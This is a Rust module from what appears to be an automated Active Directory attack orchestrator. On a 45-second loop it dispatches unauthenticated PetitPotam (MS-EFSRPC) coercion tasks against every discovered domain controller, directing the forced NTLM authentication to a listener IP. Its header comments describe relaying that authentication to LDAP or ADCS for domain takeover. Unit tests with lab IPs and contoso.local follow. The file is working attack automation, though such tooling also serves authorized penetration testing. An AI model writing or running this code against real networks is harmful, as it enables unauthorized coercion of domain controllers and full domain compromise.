//! auto_petitpotam_unauth -- attempt unauthenticated PetitPotam (MS-EFSRPC)
//! coercion against DCs.
//!
//! On unpatched systems, EfsRpcOpenFileRaw allows unauthenticated NTLM coercion.
//! This was patched in August 2021 (KB5005413) but many environments still have
//! it open. The check requires no credentials — only a listener IP and DC target.
//!
//! If successful, the captured DC machine account NTLM auth can be relayed to
//! LDAP or ADCS for domain takeover.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;
use crate::orchestrator::state::*;

/// Attempts unauthenticated PetitPotam against each DC once.
/// Interval: 45s.
pub async fn auto_petitpotam_unauth(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(45));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("petitpotam_unauth") {
            continue;
        }

        let listener = match dispatcher.config.listener_ip.as_deref() {
            Some(ip) => ip.to_string(),
            None => continue,
        };

        let work: Vec<PetitPotamWork> = {
            let state = dispatcher.state.read().await;

            state
                .domain_controllers
                .iter()
                .filter(|(_, dc_ip)| dc_ip.as_str() != listener)
                .filter(|(_, dc_ip)| {
                    let dedup_key = format!("petitpotam_unauth:{dc_ip}");
                    !state.is_processed(DEDUP_PETITPOTAM_UNAUTH, &dedup_key)
                })
                .map(|(domain, dc_ip)| PetitPotamWork {
                    dedup_key: format!("petitpotam_unauth:{dc_ip}"),
                    domain: domain.clone(),
                    dc_ip: dc_ip.clone(),
                    listener: listener.clone(),
                })
                .collect()
        };

        for item in work {
            let payload = json!({
                "technique": "petitpotam_unauthenticated",
                "target_ip": item.dc_ip,
                "domain": item.domain,
                "listener_ip": item.listener,
            });

            let priority = dispatcher.effective_priority("petitpotam_unauth");
            match dispatcher
                .throttled_submit("coercion", "coercion", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        domain = %item.domain,
                        dc = %item.dc_ip,
                        "Unauthenticated PetitPotam coercion dispatched"
                    );

                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_PETITPOTAM_UNAUTH, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_PETITPOTAM_UNAUTH, &item.dedup_key)
                        .await;
                }
                Ok(None) => {
                    debug!(dc = %item.dc_ip, "PetitPotam unauth deferred");
                }
                Err(e) => {
                    warn!(err = %e, dc = %item.dc_ip, "Failed to dispatch PetitPotam unauth");
                }
            }
        }
    }
}

struct PetitPotamWork {
    dedup_key: String,
    domain: String,
    dc_ip: String,
    listener: String,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dedup_key_format() {
        let key = format!("petitpotam_unauth:{}", "192.168.58.10");
        assert_eq!(key, "petitpotam_unauth:192.168.58.10");
    }

    #[test]
    fn dedup_set_name() {
        assert_eq!(DEDUP_PETITPOTAM_UNAUTH, "petitpotam_unauth");
    }

    #[test]
    fn skips_self_listener() {
        let dc_ip = "192.168.58.50";
        let listener = "192.168.58.50";
        assert_eq!(dc_ip, listener);
    }

    #[test]
    fn no_cred_required() {
        // PetitPotam unauth works without credentials
        let _payload = serde_json::json!({
            "technique": "petitpotam_unauthenticated",
            "target_ip": "192.168.58.10",
            "listener_ip": "192.168.58.50",
        });
        // No credential field needed
    }

    #[test]
    fn payload_structure_has_correct_technique() {
        let payload = serde_json::json!({
            "technique": "petitpotam_unauthenticated",
            "target_ip": "192.168.58.10",
            "domain": "contoso.local",
            "listener_ip": "192.168.58.50",
        });
        assert_eq!(payload["technique"], "petitpotam_unauthenticated");
        assert_eq!(payload["target_ip"], "192.168.58.10");
        assert_eq!(payload["domain"], "contoso.local");
        assert_eq!(payload["listener_ip"], "192.168.58.50");
        assert!(payload.get("credential").is_none());
    }

    #[test]
    fn work_struct_construction() {
        let work = PetitPotamWork {
            dedup_key: "petitpotam_unauth:192.168.58.10".into(),
            domain: "contoso.local".into(),
            dc_ip: "192.168.58.10".into(),
            listener: "192.168.58.50".into(),
        };
        assert_eq!(work.domain, "contoso.local");
        assert_eq!(work.dc_ip, "192.168.58.10");
        assert_eq!(work.listener, "192.168.58.50");
    }

    #[test]
    fn dedup_key_based_on_dc_ip() {
        let dc_ip = "192.168.58.10";
        let key = format!("petitpotam_unauth:{dc_ip}");
        assert_eq!(key, "petitpotam_unauth:192.168.58.10");
    }

    #[test]
    fn dedup_keys_differ_per_dc() {
        let key1 = format!("petitpotam_unauth:{}", "192.168.58.10");
        let key2 = format!("petitpotam_unauth:{}", "192.168.58.20");
        assert_ne!(key1, key2);
    }

    #[test]
    fn listener_excluded_from_targets() {
        let dc_ip = "192.168.58.10";
        let listener = "192.168.58.50";
        assert_ne!(dc_ip, listener, "DC should not be the listener");

        let self_target_dc = "192.168.58.50";
        assert_eq!(self_target_dc, listener, "Self-targeting should be skipped");
    }
}
